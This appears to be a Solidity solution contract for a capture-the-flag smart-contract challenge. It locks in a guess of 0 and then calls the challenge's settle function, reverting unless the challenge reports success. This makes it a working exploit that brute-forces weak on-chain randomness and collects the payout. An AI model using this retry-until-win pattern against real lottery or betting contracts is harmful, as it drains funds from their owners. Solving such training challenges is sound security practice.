pragma solidity >=0.8.0;

interface IChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract Solver {
    IChallenge private challenge;

    constructor(address adr) {
        challenge = IChallenge(adr);
    }

    function lockGuess() public payable {
        require(msg.value == 1 ether, "require 1 ether");
        // set 0 as guess
        challenge.lockInGuess{value: 1 ether}(0);
    }

    function settle() public {
        challenge.settle();
        require(challenge.isComplete(), "not completed");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
